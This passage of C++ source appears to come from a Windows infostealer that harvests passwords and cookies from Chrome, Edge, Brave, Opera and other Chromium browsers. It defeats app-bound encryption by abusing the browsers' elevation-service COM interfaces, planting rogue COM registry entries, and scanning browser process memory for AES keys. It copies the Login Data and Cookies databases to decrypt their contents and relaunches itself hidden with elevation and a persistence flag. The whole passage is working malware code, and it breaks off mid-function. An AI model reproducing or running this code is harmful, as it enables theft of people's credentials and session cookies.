    struct US { USHORT len, max; PVOID buf; };
    US us{};
    if (!ReadProcessMemory(p, (BYTE*)par + 0x70, &us, sizeof(us), NULL)) return false;
    if (!us.buf || us.len < 2 || us.len > 8192) return false;
    out.resize(us.len / sizeof(wchar_t));
    SIZE_T got = 0;
    if (!ReadProcessMemory(p, us.buf, &out[0], us.len, &got) || got < 2) return false;
    out.resize(got / sizeof(wchar_t));
    return true;
}

/* the Application dir the browser actually runs from, discovered from a live
   process image path. Works for per-user installs, which have no service. */
static std::wstring RootFromProcess(const wchar_t* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return {};
    PROCESSENTRY32W pe{ sizeof(pe) };
    std::wstring dir;
    if (Process32FirstW(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, exeName) != 0) continue;
        std::wstring img = ImagePathOf(pe.th32ProcessID);
        if (img.empty()) continue;
        size_t s = img.find_last_of(L'\\');
        if (s == std::wstring::npos) continue;
        dir = img.substr(0, s);
        break;
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return dir;
}

/* Application dir candidates, in order: live process, per-user, machine */
static std::vector<std::wstring> AppRootsFor(const std::string& label) {
    const VendorInfo* vi = VendorFor(label);
    std::vector<std::wstring> out;
    if (!vi) return out;

    std::wstring live = RootFromProcess(vi->exe);
    if (!live.empty()) out.push_back(live);

    std::wstring local = Env(L"%LOCALAPPDATA%"), pf = Env(L"%ProgramFiles%"), pf86 = Env(L"%ProgramFiles(x86)%");
    if (label == "Chrome") {
        out.push_back(local + L"\\Google\\Chrome\\Application");
        out.push_back(pf + L"\\Google\\Chrome\\Application");
    } else if (label == "Edge") {
        out.push_back(local + L"\\Microsoft\\Edge\\Application");
        if (!pf86.empty()) out.push_back(pf86 + L"\\Microsoft\\Edge\\Application");
        out.push_back(pf + L"\\Microsoft\\Edge\\Application");
    } else if (label == "Brave") {
        out.push_back(local + L"\\BraveSoftware\\Brave-Browser\\Application");
        out.push_back(pf + L"\\BraveSoftware\\Brave-Browser\\Application");
    }
    return out;
}

/* first elevation_service.exe found under any candidate root, direct or <ver> */
static std::wstring ElevatorExeFor(const std::string& label) {
    for (auto& root : AppRootsFor(label)) {
        if (root.empty()) continue;
        std::wstring direct = root + L"\\elevation_service.exe";
        if (Exists(direct)) return direct;
        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW((root + L"\\*").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        std::wstring best;
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            std::wstring cand = root + L"\\" + fd.cFileName + L"\\elevation_service.exe";
            if (Exists(cand)) { best = cand; break; }
        } while (FindNextFileW(h, &fd));
        FindClose(h);
        if (!best.empty()) return best;
    }
    return {};
}

static bool ServiceExists(const wchar_t* svc) {
    SC_HANDLE m = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!m) return false;
    SC_HANDLE s = OpenServiceW(m, svc, SERVICE_QUERY_STATUS);
    bool ok = s != NULL;
    if (s) CloseServiceHandle(s);
    CloseServiceHandle(m);
    return ok;
}

static bool StartElevatorService(const std::wstring& svc) {
    SC_HANDLE m = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!m) return false;
    SC_HANDLE s = OpenServiceW(m, svc.c_str(), SERVICE_QUERY_STATUS | SERVICE_START);
    bool ok = false;
    if (s) {
        SERVICE_STATUS st{};
        if (QueryServiceStatus(s, &st) && st.dwCurrentState == SERVICE_RUNNING) ok = true;
        else {
            StartServiceW(s, 0, NULL);
            for (int i = 0; i < 40; ++i) {
                if (QueryServiceStatus(s, &st) && st.dwCurrentState == SERVICE_RUNNING) { ok = true; break; }
                Sleep(125);
            }
        }
        CloseServiceHandle(s);
    }
    CloseServiceHandle(m);
    return ok;
}

static void AppIdsForService(const std::wstring& svc, std::set<std::wstring>& appids) {
    const HKEY roots[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    const wchar_t* subs[] = { L"SOFTWARE\\Classes\\AppID", L"SOFTWARE\\Classes\\WOW6432Node\\AppID" };
    for (auto r : roots) for (auto s : subs) {
        HKEY k;
        if (RegOpenKeyExW(r, s, 0, KEY_READ, &k) != ERROR_SUCCESS) continue;
        wchar_t n[128]; DWORD i = 0;
        for (;;) {
            DWORD nn = 128;
            if (RegEnumKeyExW(k, i++, n, &nn, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            HKEY a;
            if (RegOpenKeyExW(k, n, 0, KEY_READ, &a) != ERROR_SUCCESS) continue;
            wchar_t v[256] = {0}; DWORD vn = sizeof(v), t = 0;
            if (RegQueryValueExW(a, L"LocalService", NULL, &t, (LPBYTE)v, &vn) == ERROR_SUCCESS &&
                _wcsicmp(v, svc.c_str()) == 0) appids.insert(n);
            RegCloseKey(a);
        }
        RegCloseKey(k);
    }
}

static void ClsidsFromService(const std::wstring& svc, std::vector<CLSID>& out) {
    std::set<std::wstring> appids;
    AppIdsForService(svc, appids);
    if (appids.empty()) return;
    const HKEY roots[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    const wchar_t* subs[] = { L"SOFTWARE\\Classes\\CLSID", L"SOFTWARE\\Classes\\WOW6432Node\\CLSID" };
    for (auto r : roots) for (auto s : subs) {
        HKEY base;
        if (RegOpenKeyExW(r, s, 0, KEY_READ, &base) != ERROR_SUCCESS) continue;
        wchar_t n[128]; DWORD i = 0;
        for (;;) {
            DWORD nn = 128;
            if (RegEnumKeyExW(base, i++, n, &nn, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            std::wstring p = std::wstring(s) + L"\\" + n + L"\\AppID";
            HKEY c;
            if (RegOpenKeyExW(r, p.c_str(), 0, KEY_READ, &c) != ERROR_SUCCESS) continue;
            wchar_t v[128] = {0}; DWORD vn = sizeof(v), t = 0;
            LSTATUS st = RegQueryValueExW(c, NULL, NULL, &t, (LPBYTE)v, &vn);
            RegCloseKey(c);
            if (st != ERROR_SUCCESS || !appids.count(v)) continue;
            std::wstring g = L"{" + std::wstring(n) + L"}";
            CLSID cl;
            if (SUCCEEDED(CLSIDFromString(g.c_str(), &cl))) out.push_back(cl);
        }
        RegCloseKey(base);
    }
}

static void ClsidsFromPath(const wchar_t* hint, std::vector<CLSID>& out) {
    const HKEY roots[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
    const wchar_t* subs[] = { L"SOFTWARE\\Classes\\CLSID", L"SOFTWARE\\Classes\\WOW6432Node\\CLSID" };
    for (auto r : roots) for (auto s : subs) {
        HKEY base;
        if (RegOpenKeyExW(r, s, 0, KEY_READ, &base) != ERROR_SUCCESS) continue;
        wchar_t n[128]; DWORD i = 0;
        for (;;) {
            DWORD nn = 128;
            if (RegEnumKeyExW(base, i++, n, &nn, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            std::wstring p = std::wstring(s) + L"\\" + n + L"\\LocalServer32";
            HKEY k;
            if (RegOpenKeyExW(r, p.c_str(), 0, KEY_READ, &k) != ERROR_SUCCESS) continue;
            wchar_t v[MAX_PATH * 2] = {0}; DWORD vn = sizeof(v), t = 0;
            LSTATUS st = RegQueryValueExW(k, NULL, NULL, &t, (LPBYTE)v, &vn);
            RegCloseKey(k);
            if (st != ERROR_SUCCESS) continue;
            std::wstring q = v;
            if (q.find(L"elevation_service.exe") == std::wstring::npos) continue;
            if (q.find(hint) == std::wstring::npos) continue;
            std::wstring g = L"{" + std::wstring(n) + L"}";
            CLSID cl;
            if (SUCCEEDED(CLSIDFromString(g.c_str(), &cl))) out.push_back(cl);
        }
        RegCloseKey(base);
    }
}

static const wchar_t* kAppIdChrome = L"{8F2A1B44-7C3D-4E19-9A55-0B7C6D2E4F81}";
static const wchar_t* kAppIdEdge   = L"{3D9E5C21-1A47-4B88-8E6F-2C4D7A9B0E35}";

static bool RegisterUserAppId(const CLSID& clsid, const wchar_t* svc, const wchar_t* appId,
                              const std::wstring& server) {
    wchar_t clsidStr[64];
    if (!StringFromGUID2(clsid, clsidStr, 64)) return false;
    DWORD sl = (DWORD)((wcslen(svc) + 1) * sizeof(wchar_t));
    bool haveSvc = ServiceExists(svc);
    HKEY k;

    std::wstring a = L"Software\\Classes\\AppID\\" + std::wstring(appId);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, a.c_str(), 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        const wchar_t* runas = L"Interactive User";
        RegSetValueExW(k, L"RunAs", 0, REG_SZ, (const BYTE*)runas,
                       (DWORD)((wcslen(runas) + 1) * sizeof(wchar_t)));
        if (haveSvc) RegSetValueExW(k, L"LocalService", 0, REG_SZ, (const BYTE*)svc, sl);
        else         RegDeleteValueW(k, L"LocalService");
        RegSetValueExW(k, NULL, 0, REG_SZ, (const BYTE*)svc, sl);
        RegCloseKey(k);
    }

    std::wstring c = L"Software\\Classes\\CLSID\\" + std::wstring(clsidStr);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, c.c_str(), 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(k, L"AppID", 0, REG_SZ, (const BYTE*)appId,
                       (DWORD)((wcslen(appId) + 1) * sizeof(wchar_t)));
        RegSetValueExW(k, NULL, 0, REG_SZ, (const BYTE*)svc, sl);
        RegCloseKey(k);
    }

    if (!server.empty()) {
        std::wstring ls = c + L"\\LocalServer32";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, ls.c_str(), 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
            std::wstring quoted = L"\"" + server + L"\"";
            RegSetValueExW(k, NULL, 0, REG_SZ, (const BYTE*)quoted.c_str(),
                           (DWORD)((quoted.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(k);
        }
    }
    return haveSvc;
}

static HRESULT CreateElevator(const CLSID& clsid, const IID& iid, void** out) {
    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, out);
    if (FAILED(hr) || !*out) hr = CoCreateInstance(clsid, NULL, CLSCTX_ALL, iid, out);
    if (SUCCEEDED(hr) && *out) {
        CoSetProxyBlanket((IUnknown*)*out, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                          RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                          NULL, EOAC_DYNAMIC_CLOAKING);
    }
    return hr;
}

template <class T>
static bool TryDecrypt(T* el, const std::vector<uint8_t>& blob, std::vector<uint8_t>& out) {
    BSTR in = SysAllocStringByteLen((LPCSTR)blob.data(), (UINT)blob.size());
    BSTR res = NULL; DWORD err = 0;
    HRESULT hr = el->DecryptData(in, &res, &err);
    SysFreeString(in);
    bool ok = false;
    if (SUCCEEDED(hr) && res) {
        UINT n = SysStringByteLen(res);
        if (n >= 32) { out.assign((uint8_t*)res, (uint8_t*)res + 32); ok = true; }
        SysFreeString(res);
    }
    g_dbg += "dec=" + Hex(hr) + "/e" + std::to_string(err) + " ";
    return ok;
}

static std::vector<uint8_t> AbeViaCom(const std::vector<uint8_t>& blob, const std::string& label) {
    std::vector<uint8_t> key;
    const VendorInfo* vi = VendorFor(label);
    if (!vi) return key;

    std::wstring srv = ElevatorExeFor(label);
    if (!srv.empty() && ServiceExists(vi->svc)) StartElevatorService(vi->svc);

    std::vector<CLSID> clsids;
    clsids.push_back(*vi->clsid);
    if (ServiceExists(vi->svc)) ClsidsFromService(vi->svc, clsids);
    if (clsids.size() <= 1 && !srv.empty()) ClsidsFromPath(vi->pathHint, clsids);

    bool reg = RegisterUserAppId(*vi->clsid, vi->svc,
                                 vi->edgeLayout ? kAppIdEdge : kAppIdChrome, srv);
    g_dbg += std::string("svc=") + (ServiceExists(vi->svc) ? "1" : "0") +
             " srv=" + (srv.empty() ? "0" : "1") + " reg=" + (reg ? "1" : "0") +
             " clsids=" + std::to_string(clsids.size()) + " ";

    for (size_t ci = 0; ci < clsids.size() && key.empty(); ++ci) {
        for (size_t ii = 0; ii < vi->iids.size() && key.empty(); ++ii) {
            void* raw = NULL;
            HRESULT hr = CreateElevator(clsids[ci], *vi->iids[ii], &raw);
            g_dbg += "cci" + std::to_string(ci) + "." + std::to_string(ii) + "=" + Hex(hr) + " ";
            if (FAILED(hr) || !raw) continue;
            if (vi->edgeLayout) {
                auto* el = (IElevatorEdge*)raw;
                if (TryDecrypt(el, blob, key)) { el->Release(); break; }
                el->Release();
            } else {
                auto* el = (IElevatorChrome*)raw;
                if (TryDecrypt(el, blob, key)) { el->Release(); break; }
                el->Release();
            }
        }
    }
    g_dbg += "len=" + std::to_string(key.size()) + "\n";
    return key;
}

struct KeySet { std::vector<uint8_t> dpapi; std::vector<uint8_t> appBound; };

static std::vector<uint8_t> JsonField(const std::string& j, const char* key) {
    size_t p = j.find(std::string("\"") + key + "\"");
    if (p == std::string::npos) return {};
    p = j.find('"', j.find(':', p));
    if (p == std::string::npos) return {};
    size_t e = j.find('"', p + 1);
    if (e == std::string::npos) return {};
    return B64Dec(j.substr(p + 1, e - p - 1));
}
static std::vector<uint8_t> GetDpapiKey(const std::wstring& ls) {
    std::vector<uint8_t> raw = JsonField(ReadAll(ls), "encrypted_key");
    if (raw.size() < 6) return {};
    return DpapiUnprotect(std::vector<uint8_t>(raw.begin() + 5, raw.end()));
}

/* ---------- sqlite staging ---------- */
static std::wstring Stage(const std::wstring& src) {
    if (!Exists(src)) return {};
    std::wstring dst = TempDir() + L"\\" + RandName() + L".db";
    if (!CopyFileW(src.c_str(), dst.c_str(), FALSE)) return {};
    CopyFileW((src + L"-wal").c_str(), (dst + L"-wal").c_str(), FALSE);
    CopyFileW((src + L"-shm").c_str(), (dst + L"-shm").c_str(), FALSE);
    return dst;
}
static void Unstage(const std::wstring& p) {
    if (p.empty()) return;
    DeleteFileW(p.c_str());
    DeleteFileW((p + L"-wal").c_str());
    DeleteFileW((p + L"-shm").c_str());
}
static sqlite3* OpenStaged(const std::wstring& p) {
    sqlite3* db = NULL;
    if (sqlite3_open_v2(W2A(p).c_str(), &db, SQLITE_OPEN_READWRITE, NULL) != SQLITE_OK) {
        if (db) { sqlite3_close(db); db = NULL; }
    }
    return db;
}

static bool ChromeDecrypt(const KeySet& ks, const std::vector<uint8_t>& blob,
                          const std::vector<std::vector<uint8_t>>& aads,
                          std::string& out, bool strip32) {
    if (blob.size() < 3 + 12 + 16 + 1 || blob[0] != 'v') return false;
    int ver = (blob[1] - '0') * 10 + (blob[2] - '0');
    if (ver < 10 || ver > 29) return false;

    const bool abe = (ver >= 20 || ver == 11);
    const std::vector<uint8_t>* k = abe ? &ks.appBound : &ks.dpapi;
    if (k->size() != 32) k = abe ? &ks.dpapi : &ks.appBound;
    if (k->size() != 32) return false;

    std::vector<uint8_t> iv(blob.begin() + 3, blob.begin() + 15);
    std::vector<uint8_t> ct(blob.begin() + 15, blob.end() - 16);
    std::vector<uint8_t> tag(blob.end() - 16, blob.end());
    for (auto& aad : aads) {
        std::vector<uint8_t> plain;
        if (!GcmDec(*k, iv, ct, tag, aad, plain)) continue;
        size_t off = 0;
        if (abe && strip32) {
            if (plain.size() <= 32) { out.clear(); return true; }
            off = 32;
        }
        out.assign(plain.begin() + off, plain.end());
        return true;
    }
    return false;
}

static bool ValidateAbeKey(const std::wstring& userData, const std::vector<uint8_t>& key) {
    if (key.size() != 32) return false;
    std::wstring ck = userData + L"\\Default\\Network\\Cookies";
    if (!Exists(ck)) ck = userData + L"\\Default\\Cookies";
    std::wstring ckd = Stage(ck);
    if (ckd.empty()) return true;
    bool ok = false; int tested = 0;
    sqlite3* db = OpenStaged(ckd);
    if (db) {
        sqlite3_stmt* st = NULL;
        if (sqlite3_prepare_v2(db,
                "SELECT host_key,encrypted_value FROM cookies WHERE length(encrypted_value)>63 LIMIT 64",
                -1, &st, NULL) == SQLITE_OK) {
            while (sqlite3_step(st) == SQLITE_ROW && !ok && tested < 64) {
                std::string host = sqlite3_column_text(st, 0) ? (const char*)sqlite3_column_text(st, 0) : "";
                const void* ev = sqlite3_column_blob(st, 1);
                int evn = sqlite3_column_bytes(st, 1);
                if (!ev || evn < 63) continue;
                std::vector<uint8_t> blob((uint8_t*)ev, (uint8_t*)ev + evn);
                if (blob[0] != 'v' || blob[1] != '2') continue;
                ++tested;
                std::vector<uint8_t> hv(host.begin(), host.end());
                std::vector<std::vector<uint8_t>> aads;
                aads.push_back({});
                aads.push_back(Hash(BCRYPT_SHA256_ALGORITHM, hv));
                aads.push_back(hv);
                KeySet ks; ks.appBound = key;
                std::string dec;
                if (ChromeDecrypt(ks, blob, aads, dec, true)) ok = true;
            }
            sqlite3_finalize(st);
        }
        sqlite3_close(db);
    }
    Unstage(ckd);
    if (tested == 0) return true;
    return ok;
}

/* ---------- memory scan ---------- */
struct ProbeVec { std::vector<uint8_t> iv, ct, tag; };

static bool AddProbe(const std::vector<uint8_t>& blob, std::vector<ProbeVec>& out) {
    if (blob.size() < 3 + 12 + 16 + 1 || blob[0] != 'v') return false;
    ProbeVec v;
    v.iv.assign(blob.begin() + 3, blob.begin() + 15);
    v.ct.assign(blob.begin() + 15, blob.end() - 16);
    v.tag.assign(blob.end() - 16, blob.end());
    out.push_back(v);
    return true;
}

static void CollectProbes(const std::wstring& userData, std::vector<ProbeVec>& out, size_t max) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((userData + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    std::vector<std::wstring> dirs;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        std::wstring n = fd.cFileName;
        if (n == L"Default" || n.rfind(L"Profile", 0) == 0) dirs.push_back(userData + L"\\" + n);
    } while (FindNextFileW(h, &fd));
    FindClose(h);

    for (auto& d : dirs) {
        if (out.size() >= max) return;
        std::wstring ld = Stage(d + L"\\Login Data");
        if (ld.empty()) continue;
        sqlite3* db = OpenStaged(ld);
        if (db) {
            sqlite3_stmt* s = NULL;
            if (sqlite3_prepare_v2(db,
                    "SELECT password_value FROM logins WHERE length(password_value)>63 LIMIT 4",
                    -1, &s, NULL) == SQLITE_OK) {
                while (sqlite3_step(s) == SQLITE_ROW && out.size() < max) {
                    const void* b = sqlite3_column_blob(s, 0);
                    int n = sqlite3_column_bytes(s, 0);
                    if (b && n > 63) AddProbe(std::vector<uint8_t>((uint8_t*)b, (uint8_t*)b + n), out);
                }
                sqlite3_finalize(s);
            }
            sqlite3_close(db);
        }
        Unstage(ld);
    }
    for (auto& d : dirs) {
        if (out.size() >= max) return;
        std::wstring ck = d + L"\\Network\\Cookies";
        if (!Exists(ck)) ck = d + L"\\Cookies";
        std::wstring stg = Stage(ck);
        if (stg.empty()) continue;
        sqlite3* db = OpenStaged(stg);
        if (db) {
            sqlite3_stmt* s = NULL;
            if (sqlite3_prepare_v2(db,
                    "SELECT encrypted_value FROM cookies WHERE length(encrypted_value)>63 LIMIT 8",
                    -1, &s, NULL) == SQLITE_OK) {
                while (sqlite3_step(s) == SQLITE_ROW && out.size() < max) {
                    const void* b = sqlite3_column_blob(s, 0);
                    int n = sqlite3_column_bytes(s, 0);
                    if (b && n > 63) AddProbe(std::vector<uint8_t>((uint8_t*)b, (uint8_t*)b + n), out);
                }
                sqlite3_finalize(s);
            }
            sqlite3_close(db);
        }
        Unstage(stg);
    }
}

struct GcmProbe {
    BCRYPT_ALG_HANDLE h = NULL;
    std::vector<ProbeVec> v;
    bool Init() {
        if (BCryptOpenAlgorithmProvider(&h, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
        BCryptSetProperty(h, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        return true;
    }
    bool Test(const uint8_t* k, size_t klen) const {
        BCRYPT_KEY_HANDLE hk = NULL;
        if (BCryptGenerateSymmetricKey(h, &hk, NULL, 0, (PUCHAR)k, (ULONG)klen, 0) != 0) return false;
        bool hit = false;
        for (auto& p : v) {
            std::vector<uint8_t> buf(p.ct.size() + 16);
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai; BCRYPT_INIT_AUTH_MODE_INFO(ai);
            ai.pbNonce = (PUCHAR)p.iv.data(); ai.cbNonce = (ULONG)p.iv.size();
            ai.pbTag = (PUCHAR)p.tag.data(); ai.cbTag = (ULONG)p.tag.size();
            ULONG done = 0;
            if (BCryptDecrypt(hk, (PUCHAR)p.ct.data(), (ULONG)p.ct.size(), &ai, NULL, 0,
                              buf.data(), (ULONG)buf.size(), &done, 0) == 0) { hit = true; break; }
        }
        BCryptDestroyKey(hk);
        return hit;
    }
    ~GcmProbe() { if (h) BCryptCloseAlgorithmProvider(h, 0); }
};

static bool PlausibleKey(const uint8_t* k) {
    uint8_t orv = 0, andv = 0xFF; int bits = 0;
    for (int i = 0; i < 32; ++i) { orv |= k[i]; andv &= k[i]; }
    if (orv == 0 || orv == andv) return false;
    for (int i = 0; i < 32; ++i) for (int b = 0; b < 8; ++b) bits += (k[i] >> b) & 1;
    return bits >= 96 && bits <= 160;
}

static int ProcScore(const std::wstring& c) {
    if (c.find(L"--type=utility") != std::wstring::npos)
        return (c.find(L"network.mojom.NetworkService") != std::wstring::npos) ? 100 : 20;
    if (c.find(L"--type=") == std::wstring::npos) return 90;
    return 5;
}

static bool ScanPid(HANDLE p, const GcmProbe& probe, SIZE_T cap,
                    std::vector<uint8_t>& chunk, std::vector<uint8_t>& out) {
    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    SIZE_T total = 0;
    BYTE* addr = (BYTE*)si.lpMinimumApplicationAddress;
    while (addr < (BYTE*)si.lpMaximumApplicationAddress && total < cap) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQueryEx(p, addr, &mbi, sizeof(mbi)) != sizeof(mbi)) { addr += 0x1000; continue; }
        BYTE* base = (BYTE*)mbi.BaseAddress;
        SIZE_T sz = mbi.RegionSize;
        bool good = mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE &&
                    !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
                    (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
                                    PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY));
        if (good && sz >= 32) {
            const SIZE_T STEP = 64 * 1024;
            for (SIZE_T off = 0; off < sz && total < cap; off += STEP) {
                SIZE_T want = (sz - off < STEP) ? sz - off : STEP;
                chunk.resize(want);
                SIZE_T got = 0;
                if (!ReadProcessMemory(p, base + off, chunk.data(), want, &got) || got < 32) continue;
                total += got;
                SIZE_T misalign = ((SIZE_T)(base + off)) & 15;
                for (SIZE_T i = misalign ? 16 - misalign : 0; i + 32 <= got; i += 16) {
                    const uint8_t* c = chunk.data() + i;
                    if (!PlausibleKey(c)) continue;
                    if (probe.Test(c, 32)) { out.assign(c, c + 32); return true; }
                }
            }
        }
        addr = base + sz;
    }
    return false;
}

static std::vector<uint8_t> KeyFromMemory(const std::string& image, const std::wstring& userData) {
    if (userData.empty()) return {};
    GcmProbe probe;
    CollectProbes(userData, probe.v, MAX_PROBES);
    if (probe.v.empty()) { g_dbg += "ABE: no probe vector\n"; return {}; }
    if (!probe.Init()) return {};
    g_dbg += "ABE: probes=" + std::to_string(probe.v.size()) + "\n";

    std::vector<std::wstring> imgs;
    if (!image.empty()) imgs.push_back(A2W(image));
    imgs.push_back(L"elevation_service.exe");

    std::vector<std::vector<DWORD>> groups(imgs.size());
    for (size_t gi = 0; gi < imgs.size(); ++gi) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) continue;
        PROCESSENTRY32W pe{ sizeof(pe) };
        if (Process32FirstW(snap, &pe)) do {
            if (_wcsicmp(pe.szExeFile, imgs[gi].c_str()) == 0) groups[gi].push_back(pe.th32ProcessID);
        } while (Process32NextW(snap, &pe));
        CloseHandle(snap);
    }

    std::set<DWORD> done;
    std::vector<uint8_t> hit, chunk;

    for (size_t gi = 0; gi < groups.size(); ++gi) {
        if (groups[gi].empty()) continue;
        std::vector<std::pair<int, DWORD>> ranked;
        for (DWORD pid : groups[gi]) {
            HANDLE q = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            std::wstring cl; int sc = 50;
            if (q) { if (ProcCmdLine(q, cl)) sc = ProcScore(cl); CloseHandle(q); }
            ranked.push_back({ sc, pid });
        }
        std::sort(ranked.begin(), ranked.end(),
                  [](const std::pair<int, DWORD>& a, const std::pair<int, DWORD>& b) {
                      if (a.first != b.first) return a.first > b.first;
                      return a.second < b.second;
                  });
        size_t keep = 0;
        while (keep < ranked.size() && keep < 4 && ranked[keep].first >= 50) ++keep;
        if (keep == 0) keep = std::min<size_t>(ranked.size(), 3);
        g_dbg += "ABE: scan " + std::to_string(keep) + "/" +
                 std::to_string(groups[gi].size()) + "x" + W2A(imgs[gi]) + "\n";
        for (size_t i = 0; i < keep; ++i) {
            done.insert(ranked[i].second);
            HANDLE p = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ranked[i].second);
            if (!p) { g_dbg += "open" + std::to_string(ranked[i].second) + "=x "; continue; }
            bool got = ScanPid(p, probe, 512ull << 20, chunk, hit);
            CloseHandle(p);
            if (got) { g_dbg += "ABE: hit pid " + std::to_string(ranked[i].second) + "\n"; return hit; }
        }
    }
    g_dbg += "ABE: memory scan exhausted\n";
    return {};
}

/* ---------- ABE resolution ---------- */
static std::vector<uint8_t> AbeViaComInPath(const std::vector<uint8_t>& blob, const std::string& label);

struct AbeItem { std::string label; std::wstring dir; std::vector<uint8_t> blob; };

static void HarvestAbeBlobs(std::vector<AbeItem>& out) {
    struct B { std::wstring dir; std::string label; };
    std::vector<B> list = {
        { g_ulocal + L"\\Google\\Chrome\\User Data", "Chrome" },
        { g_ulocal + L"\\Microsoft\\Edge\\User Data", "Edge" },
        { g_ulocal + L"\\BraveSoftware\\Brave-Browser\\User Data", "Brave" },
        { g_ulocal + L"\\Vivaldi\\User Data", "Vivaldi" },
        { g_ulocal + L"\\Yandex\\YandexBrowser\\User Data", "Yandex" },
        { g_uroam + L"\\Opera Software\\Opera Stable", "Opera" },
        { g_uroam + L"\\Opera Software\\Opera GX Stable", "OperaGX" },
        { g_ulocal + L"\\Chromium\\User Data", "Chromium" },
    };
    for (auto& b : list) {
        std::vector<uint8_t> raw = JsonField(ReadAll(b.dir + L"\\Local State"), "app_bound_encrypted_key");
        if (raw.size() < 40 || memcmp(raw.data(), "APPB", 4) != 0) continue;
        out.push_back({ b.label, b.dir, std::vector<uint8_t>(raw.begin() + 4, raw.end()) });
    }
}

static void ElevatedAttempt(const std::vector<AbeItem>& items, std::string& results) {
    for (auto& it : items) {
        std::vector<uint8_t> k = AbeViaDpapi(it.blob);
        if (k.size() == 32) { results += "K\t" + it.label + "\t" + ToHex(k) + "\n"; continue; }
        g_dbg += "ABE: " + it.label + " dpapi fail\n";

        k = AbeViaComInPath(it.blob, it.label);
        if (k.size() == 32) { results += "K\t" + it.label + "\t" + ToHex(k) + "\n"; continue; }

        char kind = 0; std::vector<uint8_t> p;
        if (!PeelSystem(it.blob, kind, p, false)) { g_dbg += "ABE: " + it.label + " peel fail\n"; continue; }
        results += std::string(1, kind) + "\t" + it.label + "\t" + ToHex(p) + "\n";
    }
}

static void ResolveAbeKeys() {
    std::vector<AbeItem> items;
    HarvestAbeBlobs(items);
    if (items.empty()) { g_dbg += "ABE: no app-bound blobs\n"; return; }

    std::string results;

    if (IsElevated()) {
        ElevatedAttempt(items, results);
    } else {
        std::wstring self = SelfPath();
        std::wstring in  = TempDir() + L"\\abe_in_" + RandName() + L".txt";
        std::wstring out = TempDir() + L"\\abe_out_" + RandName() + L".txt";
        std::string req;
        for (auto& it : items) req += it.label + "\t" + W2A(it.dir) + "\t" + ToHex(it.blob) + "\n";
        FILE* f = _wfopen(in.c_str(), L"wb");
        if (!f) return;
        fwrite(req.data(), 1, req.size(), f);
        fclose(f);

        std::wstring params = L"--elevated-job=\"" + in + L"\" --out=\"" + out +
                              L"\" --persist=\"" + self + L"\"";
        for (int attempt = 0; attempt < 2 && results.empty(); ++attempt) {
            SHELLEXECUTEINFOW si{ sizeof(si) };
            si.lpVerb = L"runas";
            si.lpFile = self.c_str();
            si.lpParameters = params.c_str();
            si.nShow = SW_HIDE;
            si.fMask = SEE_MASK_NOCLOSEPROCESS;
            if (ShellExecuteExW(&si)) {
                if (si.hProcess) { WaitForSingleObject(si.hProcess, 5 * 60 * 1000); CloseHandle(si.hProcess); }
                results = ReadAll(out);
            } else {
                g_dbg += "ABE: elevation failed, err=" + std::to_string(GetLastError()) + "\n";
            }
        }
        DeleteFileW(in.c_str());
        DeleteFileW(out.c_str());
    }

    size_t pos = 0;
    while (pos < results.size()) {
        size_t e = results.find('\n', pos);
        if (e == std::string::npos) break;
        std::string line = results.substr(pos, e - pos); pos = e + 1;
        size_t t1 = line.find('\t'); if (t1 == std::string::npos) continue;
        size_t t2 = line.find('\t', t1 + 1); if (t2 == std::string::npos) continue;
        char kind = line[0];
        std::string label = line.substr(t1 + 1, t2 - t1 - 1);
        std::vector<uint8_t> payload = Unhex(line.substr(t2 + 1));
        std::vector<uint8_t> key;
        if (kind == 'K') key = payload;
        else if (kind == 'S') {
            std::vector<uint8_t> plain = DpapiUnprotect(payload);
